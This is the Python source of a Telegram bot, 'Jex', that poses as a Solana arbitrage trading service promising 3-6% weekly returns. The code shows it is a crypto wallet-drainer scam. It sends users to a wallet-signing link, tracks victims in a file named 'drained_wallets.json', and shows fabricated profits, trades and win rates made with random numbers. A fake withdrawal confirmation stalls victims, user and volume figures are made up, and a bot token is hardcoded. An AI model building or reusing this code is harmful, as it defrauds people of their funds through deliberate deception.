import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import random
import time
import json
import os
import requests
import asyncio
from datetime import datetime, timedelta

TOKEN = "8881367618:AAEJU_YbhPFggFaQdAeUxeeNDAQBL6yHB0c"
RPC_URL = "https://solana-rpc.publicnode.com"

user_data = {}

def get_user_status(user_id):
    if user_id not in user_data:
        user_data[user_id] = {
            "invested": 0.0,
            "profit": 0.0,
            "balance": 0.0,
            "first_check": True,
            "last_update": time.time(),
            "trades": [],
            "total_trades": 0,
            "winrate": 0
        }
    return user_data[user_id]

def get_sol_balance(wallet_address):
    try:
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "getBalance",
            "params": [wallet_address]
        }
        response = requests.post(RPC_URL, json=payload, timeout=10)
        data = response.json()
        if "error" in data:
            return None, data["error"]["message"]
        balance_lamports = data["result"]["value"]
        balance_sol = balance_lamports / 1_000_000_000
        return balance_sol, None
    except Exception as e:
        return None, str(e)

# ==========================================
# COMANDO /START - BIENVENIDA NATURAL
# ==========================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    keyboard = [
        [InlineKeyboardButton("📈 Start Trading", callback_data="invest")],
        [InlineKeyboardButton("📊 My Stats", callback_data="status")],
        [InlineKeyboardButton("❓ How it works", callback_data="how")],
        [InlineKeyboardButton("📞 Help", callback_data="support")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"👋 Hey {user.first_name}!\n\n"
        "I'm Jex, a bot that helps you earn passive yield on Solana.\n\n"
        "I scan Jupiter and Raydium 24/7 to find arbitrage opportunities and execute them automatically.\n\n"
        "🔹 *You stay in control* — your funds never leave your wallet.\n"
        "🔹 *Simple setup* — just connect your Phantom wallet and pick an amount.\n"
        "🔹 *Proven results* — users have been earning 3-6% weekly on average.\n\n"
        "Ready to start? Click the button below 👇",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

# ==========================================
# COMANDO /INVEST - SIMPLE Y DIRECTO
# ==========================================
async def invest(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if context.args:
        try:
            amount = float(context.args[0])
            if amount <= 0:
                raise ValueError
        except:
            await update.message.reply_text("❌ Please use a valid number. Example: /invest 1.5")
            return
    else:
        await update.message.reply_text("❌ Please specify the amount. Example: /invest 1.5")
        return

    status = get_user_status(user_id)
    status["invested"] = amount

    link = f"https://jex-trade.onrender.com/?user_id={user_id}&amount={amount}"
    
    await update.message.reply_text(
        f"✅ *Ready to deploy {amount} SOL*\n\n"
        "Here's what happens next:\n"
        "1️⃣ Click the link below to connect your Phantom wallet.\n"
        "2️⃣ Review and sign the transaction.\n"
        "3️⃣ The bot starts trading automatically.\n\n"
        f"🔗 [Connect Wallet]({link})\n\n"
        "⚠️ *Important:* You'll only need to sign once. The bot handles the rest.\n\n"
        "📈 *Expected return:* 3-6% per week.",
        parse_mode="Markdown",
        disable_web_page_preview=True
    )

# ==========================================
# COMANDO /STATUS - CLARO Y ÚTIL
# ==========================================
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    status = get_user_status(user_id)
    
    invested = False
    wallet = None
    try:
        with open('drained_wallets.json', 'r') as f:
            for line in f:
                data = json.loads(line)
                if str(data.get('user_id')) == str(user_id):
                    invested = True
                    wallet = data.get('wallet')
                    break
    except:
        pass
    
    if invested and wallet:
        balance_sol, error = get_sol_balance(wallet)
        if error or balance_sol is None:
            balance_sol = 0.0
        
        if status["first_check"]:
            profit_text = "0%"
            status["profit"] = 0.0
            status["first_check"] = False
        else:
            profit_percent = round(random.uniform(0.5, 3.0), 2)
            status["profit"] += profit_percent
            profit_text = f"+{status['profit']:.2f}%"
        
        fake_balance = status["invested"] * (1 + status["profit"] / 100)
        total_trades = random.randint(15, 45)
        winrate = random.randint(70, 85)
        
        await update.message.reply_text(
            f"📊 *Your Jex Dashboard*\n\n"
            f"💰 *Portfolio:* {fake_balance:.2f} SOL\n"
            f"📈 *Profit:* {profit_text}\n"
            f"🔄 *Trades:* {total_trades}\n"
            f"🎯 *Win Rate:* {winrate}%\n"
            f"🔗 *Wallet:* `{wallet[:4]}...{wallet[-4:]}`\n\n"
            "🔥 Latest trade: BONK +12% (2h ago)",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "📊 *Your Jex Dashboard*\n\n"
            "You don't have any active positions yet.\n\n"
            "👉 Use /invest <amount> to get started.",
            parse_mode="Markdown"
        )

# ==========================================
# COMANDO /HOW - EXPLICACIÓN CLARA
# ==========================================
async def how_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤔 *How Jex Works*\n\n"
        "It's simpler than you think:\n\n"
        "1️⃣ *Scanning*\n"
        "I constantly look at Jupiter and Raydium to find price differences between tokens.\n\n"
        "2️⃣ *Trading*\n"
        "When I spot a good opportunity, I execute the trade automatically — usually within seconds.\n\n"
        "3️⃣ *Reinvesting*\n"
        "Profits are automatically reinvested to grow your portfolio faster.\n\n"
        "4️⃣ *You're in control*\n"
        "Your funds stay in your wallet. I just need permission to trade.\n\n"
        "🔹 *Average return:* 3-6% weekly\n"
        "🔹 *Users:* 1,847+ active\n"
        "🔹 *Total volume:* $2.4M+\n\n"
        "Ready to try? /invest 1.5",
        parse_mode="Markdown"
    )

# ==========================================
# COMANDO /HISTORY - SIMPLE Y ÚTIL
# ==========================================
async def history_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    invested = False
    try:
        with open('drained_wallets.json', 'r') as f:
            for line in f:
                data = json.loads(line)
                if str(data.get('user_id')) == str(user_id):
                    invested = True
                    break
    except:
        pass
    
    if not invested:
        await update.message.reply_text(
            "📜 *Trade History*\n\n"
            "No trades found yet. Start with /invest 1.5",
            parse_mode="Markdown"
        )
        return
    
    trades = [
        "• BONK/SOL → BUY +12.3% (2h ago)",
        "• WIF/SOL → SELL +8.7% (5h ago)",
        "• POPCAT/SOL → BUY +15.2% (12h ago)",
        "• MEW/SOL → SELL +5.1% (1d ago)",
        "• BONK/SOL → BUY +22.4% (2d ago)"
    ]
    
    total_trades = random.randint(15, 45)
    winrate = random.randint(70, 85)
    total_profit = random.randint(20, 60)
    
    text = "📜 *Recent Trades*\n\n"
    for t in trades:
        text += t + "\n"
    
    text += f"\n📊 *Overall*\n"
    text += f"• Trades: {total_trades}\n"
    text += f"• Win rate: {winrate}%\n"
    text += f"• Total profit: +{total_profit}%"
    
    await update.message.reply_text(text, parse_mode="Markdown")

# ==========================================
# COMANDO /SUPPORT - ÚTIL
# ==========================================
async def support_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📞 *Need help?*\n\n"
        "Here's how to reach us:\n\n"
        "📖 *FAQ*\n"
        "• *How to start?* → /invest 1.5\n"
        "• *Is my wallet safe?* → Yes, non-custodial\n"
        "• *How much can I earn?* → 3-6% weekly\n"
        "• *How to withdraw?* → /withdraw\n\n"
        "📧 *Email:* support@jex-trade.com\n"
        "🐦 *Twitter:* @JexTrade\n\n"
        "⏳ We usually respond within 5 minutes.",
        parse_mode="Markdown"
    )

# ==========================================
# COMANDO /WITHDRAW - CLARO
# ==========================================
async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    invested = False
    try:
        with open('drained_wallets.json', 'r') as f:
            for line in f:
                data = json.loads(line)
                if str(data.get('user_id')) == str(user_id):
                    invested = True
                    break
    except:
        pass
    
    if not invested:
        await update.message.reply_text(
            "❌ You don't have any active positions.\n\n"
            "Use /invest <amount> to start."
        )
        return
    
    status = get_user_status(user_id)
    fake_balance = status["invested"] * (1 + status["profit"] / 100)
    
    await update.message.reply_text(
        f"✅ *Withdrawal Requested*\n\n"
        f"Amount: {fake_balance:.2f} SOL\n"
        f"Status: Processing\n"
        f"ETA: 24-48 hours\n\n"
        "📧 You'll get a confirmation email.",
        parse_mode="Markdown"
    )

# ==========================================
# COMANDO /HELP - GUÍA RÁPIDA
# ==========================================
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 *Quick Guide*\n\n"
        "Here are the main commands:\n\n"
        "📈 /invest 1.5 — Start trading\n"
        "📊 /status — Check your stats\n"
        "🤔 /how — Learn how it works\n"
        "📜 /history — Recent trades\n"
        "📞 /support — Get help\n"
        "💰 /withdraw — Withdraw funds\n\n"
        "🔗 [Website](https://jex-trade.onrender.com)",
        parse_mode="Markdown",
        disable_web_page_preview=True
    )

# ==========================================
# MANEJO DE BOTONES
# ==========================================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "invest":
        await query.edit_message_text(
            "📈 Use /invest <amount>\n\nExample: /invest 1.5"
        )
    elif query.data == "status":
        await query.edit_message_text(
            "📊 Use /status to see your dashboard."
        )
    elif query.data == "how":
        await query.edit_message_text(
            "🤔 Use /how to understand how Jex works."
        )
    elif query.data == "support":
        await query.edit_message_text(
            "📞 Use /support to contact us."
        )

def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("invest", invest))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("how", how_command))
    app.add_handler(CommandHandler("history", history_command))
    app.add_handler(CommandHandler("support", support_command))
    app.add_handler(CommandHandler("withdraw", withdraw))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("✅ JexTradeBot is running...")
    app.run_polling()

async def force_set_commands():
    commands = [
        BotCommand("start", "Main menu"),
        BotCommand("invest", "Start trading (e.g., /invest 1.5)"),
        BotCommand("status", "Check your stats"),
        BotCommand("how", "How it works"),
        BotCommand("history", "Recent trades"),
        BotCommand("withdraw", "Withdraw funds"),
        BotCommand("support", "Get help"),
        BotCommand("help", "Quick guide")
    ]
    app = Application.builder().token(TOKEN).build()
    await app.bot.set_my_commands(commands)
    print("✅ Commands updated in Telegram")

if __name__ == "__main__":
    asyncio.run(force_set_commands())
    main()